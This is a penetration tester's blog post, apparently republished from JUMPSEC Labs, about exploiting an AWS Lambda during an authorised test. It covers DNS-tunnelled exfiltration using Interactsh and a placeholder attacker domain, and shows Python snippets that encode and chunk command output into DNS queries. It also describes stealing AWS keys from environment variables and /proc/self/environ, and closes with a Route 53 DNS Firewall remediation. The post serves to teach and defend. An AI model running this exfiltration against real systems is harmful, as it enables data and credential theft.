+++
title = "What's in a Name? DNS Tunnelling & AWS Lambda Exploitation (Part 2)"
date = 2024-06-13
tags = ["burpsuite", "exploitation", "network", "research", "aws", "rce"]
+++

![unnamed](unnamed.gif)

In [Part 1](/blog/dns-tunnelling-aws-lambda/) of the series we looked at how an AWS Lambda-powered feature was exploited in a web app penetration test initially leading to RCE and further on with out-of-band data exfiltration via DNS. Though the exact mechanism of achieving remote-code execution with Python was not discussed, we went in depth in how to return data as a result of the code being executed. Initially, with ascii-to-integer encoding I was able to find the username of the runtime user – sbx_userNNN.

In the first blog post, I spoke of the feature being powered by Lambda rather matter-of-factly, however during the penetration test, the "sbx_u" string was the first clue that the function I popped was powered by a Lambda.

Screenshot showing decoding results of whoami:

![pic1](pic1.png)

![pic2](pic2.png)

After proving that RCE worked stably with limited data output in the application UI, I further discovered that although the app did not talk back via HTTP or HTTPS, it was making DNS requests to arbitrary domains. While BurpSuite's Collaborator functionality was working fine for demonstrating proof-of-concept interactions, it presented a couple of problems as I went further:

![pic8](pic8.png)

1. Scalability & UX – I didn't know at the time, but had vaguely remembered, that the exact data length limit of the DNS protocol was around 255 bytes total – need to RTFM (more detail on this later). But even at this point I knew I could not chuck thousands of bytes into a domain name and ask the poor Lambda to query for us. That meant we needed to split command outputs into multiple chunks at some point. Burp is written in Java and the UI (as seen above) would require manually clicking through hundreds of queries to copy and paste the data for further decoding. I needed a tool that either wrote each query to terminal or append to a file, that I could further decode and process.
2. Privacy & Cost – Honestly, avoiding manually clicking through hundreds of queries was a good enough reason to not proceed further in Burp. However, at that juncture my concerns also included privacy. If I proceeded further on this attack path, I would potentially be exfiltrating intellectual property of the client via the oastify.com domain, which was shared by all users of Burp Collaborator, including other pentesting providers and potentially cybercriminals. Not that I don't trust PortSwigger as a company, but I don't want to mess up some of the queries on my end and potentially send the encoded data to unknown entities.
3. A final reason, which may not apply to us, but for those reading this article who are just starting out in Cyber – BurpSuite Collaborator is a paywalled feature and the annual enterprise licensing cost may be prohibitive for many hobbyists or learners.

### Moving the antenna to our own infrastructure

So, is there a private, low-cost / free DNS interaction tool which outputs the log to either the terminal or a file, and works with a domain owned by us? Initially I had fleeting thoughts of spinning up a Bind9 DNS server on a VPS and use a couple of hacked-together shell scripts to do it, but then I thought, man, there are plenty of smart folks in my team who know either this tool or that tool off like the back of their hand, which would serve my specific purpose.

I asked our techies for help. Initially our developer volunteered to adapt his custom DNS server written in Go for this purpose, but before we could see this big-brain moment through, he had other more pressing matters than pursuing this side quest (a failed motherboard I heard). Then another consultant introduced me to [Interactsh](https://github.com/projectdiscovery/interactsh), an open source tool maintained by ProjectDiscovery, designed to detect out-of-band (OOB) interactions. By default the oast.pro domain (I imagine owned by ProjectDiscovery) is used to catch queries, but one could buy a domain for a couple of bucks and tell the tool to point to it instead.

Again DNS can be quite complicated if you're not that familiar with the protocol – so I'll briefly explain how the tool works here:

```
[vuln app] ---makes DNS query A----> [server]
# then
[client] --ask for records of OOB-----> [server]
[client] <--sends DNS query A details-- [server]
```

In part 1 of this series I explained how DNS exfiltration works, so go to the relevant sections if you want a refresher on that. In the case of Interactsh, the "central server" maintained by ProjectDiscovery would resolve queries pointing towards subdomains of oast.pro. As a bug bounty hunter, you use the interactsh client to connect to the central interactsh server and be given a unique id. Any OOB interaction caught by the server, which matches your unique ID would be sent to your client and be displayed on your terminal. Screenshot below is from the README of the project, showing how the ID matching works.

![pic9](pic9.png)

In comparison, shown below is how I set Interactsh up for the engagement. As described in part 1, I needed a domain where we can edit NS and A records. Let's say we own "awesome-blogpost.com" and I decided to use subdomains of "subdomain.awesome-blogpost.com" as the query catcher. I spun up a public facing VPS with a static IP address a.b.c.d, pointed the the NS record for the subdomain to it, much like the below (read part 1 if this doesn't make much sense):

Set an NS record for `ns1.awesome-blogpost.com`

![pic10](pic10.png)

So we first start our server on the publicly-facing VPS with domain specified and the server CLI would provide you have a client token, which is like a unique password for the client to connect to (says text in the screenshot because "text" was the actual subdomain I used in the engagement).

![pic11](pic11.png)

![pic12](pic12.png)

Then on my local machine, I connect to my server with with the client token and the `-dns-only` flag, and you can see a unique URL being provided as a OOB payload. If anything makes a DNS query to "cnson… .text.awesome-blogpost.com", my server would catch it and show it to the client.

![pic13](pic13.png)

### Encoding adventures – weird Python error & RTFM

Before heading off to data encoding and the matter of writing a bootleg encoding protocol, let's first address one thing – DNS is not meant for transmitting arbitrary length messages. I found out the hard way when trying to pipe `/etc/passwd` (pentester's favorite!) through the wire – that Python complained of this (on my local testing script):

```
Traceback (most recent call last):
  File "/usr/lib/python3.10/encodings/idna.py", line 163, in encode
    raise UnicodeError("label empty or too long")
UnicodeError: label empty or too long
```

To replicate this at home, you can try to run this:

```
python3 -c 'import socket; longname = "A" * 1000; req = socket.gethostbyname(f"{longname}.example.com")'
```

What happened in that one command was Python being asked to do a DNS request for "AAAAA…(1000 of A's)…AAA.example.com". Searching for that error on Google landed me on a [StackOverflow question](https://stackoverflow.com/questions/51901399/python-requests-encoding-with-idna-codec-failed-unicodeerror-label-empty-o) where a dev encountered the same error. A knowledgeable user answered the question explaining that it was actually not a "Unicode error" but rather a DNS protocol error, implicating the cause being the subdomain within a DNS query being way too long, quote:

It seems this is an issue from the `socket` module. It fails when the URL's hostname exceeds 64 characters.
>
> This is still an open issue <https://bugs.python.org/issue32958>

Digging deeper into the bug report linked, another user wrote, quote:

> The error can be consistently reproduced when the first substring of the url hostname is greater than 64 characters long, as in "0123…..90123.example.com". This wouldn't be a problem, … so the entire "[user]:[secret]@XXX" section must be less than 65 characters long.

During the pentest I took the explaination as is because 64-byte limit sounded right, though I actually limited my encoding to 60-byte in total for some imagined "leeway". When writing this blog post, I read the [RFC1035 for DNS](https://www.rfc-editor.org/rfc/rfc1035) to confirm this (and say I have RTFM'd) and discovered, on page 7, that:

> The labels … must start with a letter, end with a letter or digit, and have as interior characters only letters, digits, and hyphen … Labels must be 63 characters or less.

Turns out that those users were slightly wrong in that the maximum subdomain / hostname / label defined by the RFC was actually 63-bytes, not 64. You can verify this with tweaking the `longname` variable to 64 and 63 in the Python oneliner above. Knowing that the final messages will be maximally 63-byte chunks definitely helps.

Next we need to think about other limitations of the DNS protocol. In the RFC we just referenced, it is also stated that a label must consist only of (case-insensitive) letters, digits and hyphen. With the input space (command output i.e. STDOUT) consisting of all printable Ascii, including symbols like `%^@*#|/`, `space` and `newline`, and the output space only consisting of letters, numbers and the unassuming hyphen `-`, it is clear that some sort of encoding scheme is needed.

The solution I came up with was the unassuming Base64 encode. Ideally you would want to encrypt the data with something like AES256 CBC as is the case for "production" C2 frameworks like Cobalt Strike, but we are dealing with a UAT build so let's just roll with what we have.

Before dealing with the message length, lets see how I implemented the encoding with the code snippet below – first we read the command output for popen() and encode into UTF-8 (because b64encode takes a byte sequence), then the payload was Base64 encoded, gets back a string with decode('UTF-8'), and remove all the trailing `=` which might appear in b64 encoding.

```
data = popen('uname -r').read().encode('UTF-8')
payload = b64encode(data).decode('utf-8').replace('=','')
url = f'http://{payload}..subdomain.awesome-blogpost.com'
lookup = gethostbyname(url)
```

On Interactsh, we should get back the encoded output:

```
[NS4xMC4yMTYtMjI1Ljg1NS5hbXpuMi54ODZfNjQK.<uuid>.subdomain.awesome-blogpost.com.] received DNS interaction from 35....
```

Using the `base64` cli utility, we would then get back the command output for `uname -r`

```
$ echo -n 'NS4xMC4yMTYtMjI1Ljg1NS5hbXpuMi54ODZfNjQK' | base64 -d
5.10.216-225.855.amzn2.x86_64
```

![pic7](pic7.png)

#### Chunks & Ordering

When I first learnt about how TCP worked, it fascinated me with the inner mechanisms of stateful sessions, message ordering, length and integrity checks, and so on. Basically the protocol involves chopping the sender's message into little chunks, and the receiver can receive them in any order, recombine the chunks, and get back the original message, with a check that a) the message is intact and, b) the message has ended. How brilliant!

Now that I am about to chop my bootleg DNS messages into 60-odd byte chunks, the minimum that I need to implement is a system which gives a little index tag to the message, and when I get back the messages in any order, my decoder will be able to rearrange them, combine back the original message, and decode them as one.

Below is how I implemented it (with a little bit of help from our friend ChatGPT…) – if the payload is less than 60 bytes long, we define that the number of segments is 0. Otherwise, it will just be the result of the length of the payload divided by 60 (e.g. for 80 byte payload, the number of segments is 2). We loop through the segments, cutting out `60*(n) to 60*(n+1) th` bytes, and finally add the index label before the payload in the final DNS query:

```
    data = popen('ls /usr/bin').read().encode('UTF-8')
    payload = b64encode(data).decode('utf-8').replace('=','')

    if len(payload) % 60 == 0:
        num_segments = 0
    else:
        num_segments = (len(payload) // 60) + 1

    for i in range(num_segments):
        start_index = i * 60
        end_index = start_index + 60
        segment = payload[start_index:end_index]
        url = f'{i}.{segment}..subdomain.awesome-blogpost.com'
```

And the glorious moment of seeing the results back:

```
    _       __                       __       __
   (_)___  / /____  _________ ______/ /______/ /_
  / / __ \/ __/ _ \/ ___/ __ '/ ___/ __/ ___/ __ \
 / / / / / /_/  __/ /  / /_/ / /__/ /_(__  ) / / /
/_/_/ /_/\__/\___/_/   \__,_/\___/\__/____/_/ /_/

        projectdiscovery.io
[INF] Listing 1 payload for OOB Testing
[INF] .subdomain.awesome-blogpost.com

[0.WwphbGlhcwphcmNoCmF3awpiMnN1bQpiYXNlMzIKYmFzZTY0CmJhc2VuYW1l.] Received DNS interaction (A) from 3.9.x.x at ...
[1.CmJhc2VuYwpiYXNoCmJhc2hidWcKYmFzaGJ1Zy02NApiZwpjYS1sZWdhY3kK.] Received DNS interaction (A) from 3.9.x.x at ...
[2.Y2F0CmNhdGNoc2VndgpjZApjaGNvbgpjaGdycApjaG1vZApjaG93bgpja3N1.] Received DNS interaction (A) from 35.177.x.x at ...
[3.bQpjb21tCmNvbW1hbmQKY29yZXV0aWxzCmNwCmNzcGxpdApjdXJsCmN1dApk.] Received DNS interaction (A) from 18.134.x.x at ...
[4.YXRlCmRkCmRmCmRpcgpkaXJjb2xvcnMKZGlybmFtZQpkbmYKZHUKZWNobwpl.] Received DNS interaction (A) from 35.177.x.x at ...
[5.Z3JlcAplbnYKZXhwYW5kCmV4cHIKZmFjdG9yCmZhbHNlCmZjCmZnCmZncmVw.] Received DNS interaction (A) from 35.177.x.x at ...
...
```

Mouse over and copy the output, run it through a oneliner to remove the extra stuff, sort it, remove the duplicates, and decode the whole thing:

```
$ xclip -o clip | cut -d ' ' -f 1 | sed 's/\[//;s/\.\]//' | sort -h | uniq > output26; python3 decode2.py output26
Decoded string:

alias
arch
awk
...
ls
md5sum
microdnf
mkdir
...
```

### Look at me, I am the Lambda now

Now we are cooking! That's basically a semi-interactive shell (with a couple of extra steps). Each command we want to run we put it in the popen(), invoke the app's feature, get back results from Interactsh, and decode in Python. I'll skip the enumeration bit and jump straight to the post-exploitation. Knowing that we are inside of an AWS Lambda, there are quite a few angles to tackle and exploit this. For more information specific to Lambda exploitation, refer to [Hacktricks' articles on this](https://hackingthe.cloud/aws/post_exploitation/lambda_persistence/). Sadly the pentest timeline was approaching its end and I felt the need to go for the highest impact finding as soon as possible, instead of exploring with a leisurely pace. Having a way to get data out and run commands, we could read environmental variables to extract the AWS secret & access keys of the application. With AWS credentials you can impersonate the application's identity and access (supposedly) whatever the app could access inside of the AWS tenant.

This was the first method I demonstrated, showing how the "AWS_ACCESS_KEY_ID" was extracted with os.envrion.

![pic14](pic14.png)

The second method, reading the environmental vars from `/proc/self/environ`:

![pic15](pic15.png)

To authenticate to AWS with these credentials on the cli, you first put the keys extracted into a profile in your `~/.aws/credentials` file like this:

![pic16](pic16.png)

Running `sts get-caller-identity`, the `whoami` for aws cli, we can see that the authentication as the lambda was successful.

![pic17](pic17.png)

Then comes the somewhat anticlimatic end to the engagement. With bruteforcing cloud resources that the Lambda's identity could access, I found that everything returned empty except the IP ranges used, which honestly wasn't much. There were some other attack vectors pertaining the Lambda angle, such as the `/invocation/next` endpoint and so on, but avenues to further lateral movement and escalation within the AWS tenant appeared to be limited.

![pic18](pic18.png)

### Epilogue – Investigations on AWS

Throughout the testing of this application I was in constant back-and-forth communications with the client to keep them up to date with my findings, and potential ways to remediate the vulnerabilities discovered. All in all, they were quite glad that we have discovered issues of this magnitude, and were shocked that the application could talk to the outside world via DNS when they supposedly "blocked everything". In the report I suggested to look into built-in cloud DNS capabilities and blocking ports alone might not be enough to stop an "air gapped" cloud app from DNS tunnelling, especially the server-less kinds. (Think Lambda for AWS, or PowerApp for Azure).

After delivering the report I couldn't stop thinking about this remediation bit because:

1. I thought it should be possible to configure that capacity, but I'm not 100% sure how to. So if I deployed a Lambda myself, I wasn't sure yet how it should be secured against this attack (besides not having an RCE, phew!).
2. Or … what if there wasn't an AWS native thing you could just enable and call it a day? Could I have just found a CVE on AWS Lambda itself?

So the lingering thought drove me to spin up my own Lambda which executed plain old Python 3.11. I set up the Network Security Group to block 0.0.0.0/0 on all the TCP and UDP ports, and gave it a go. Voila, the same issue, DNS tunnelling through and querying my Burp Collaborator. Okay, first step done. How to close it off?

I searched around for a bit for strings like "DNS Firewall" within AWS and on Google. Soon I found this: "Route 53 Resolver DNS Firewall", a billable service … that blocks port 53 after you have blocked port 53. I was like "of course Jeff, I knew you'd do this to us…".

![pic19](pic19.png)

To keep the setup description short, what you need to do is to create a rule group first. In configurations, as I needed a blanket block I defined a rule to block absolutely everything, then click add rule. If you need some DNS resolution for your internal domains, you could define a custom allowlist.

![pic20](pic20.png)

After the rules are sorted, associate the rule group with a VPC that contains your application or VM, and it's all done! The Lambda was no longer querying random DNS servers for arbitrary domains.

I hope you've enjoyed this rather convoluted story about how an app test turned into me trying to implement a custom DNS tunnelling protocol not dissimilar to what you'd see on C2 frameworks, just minus the encryption, stealth and redundancy bits. And then we investigated some obscure functionality invented by AWS to add to your cloud bill and block the same thing twice.

The client definitely found it a very cool story during our debrief and allowed me to publish it, so although we're not gonna name names, thank you unnamed client! And thank you, the reader for making it to the end.


---

*Originally published on [JUMPSEC Labs](https://labs.jumpsec.com/whats-in-a-name-writing-custom-dns-tunnelling-protocol-exploiting-unexpected-aws-lambda/)*
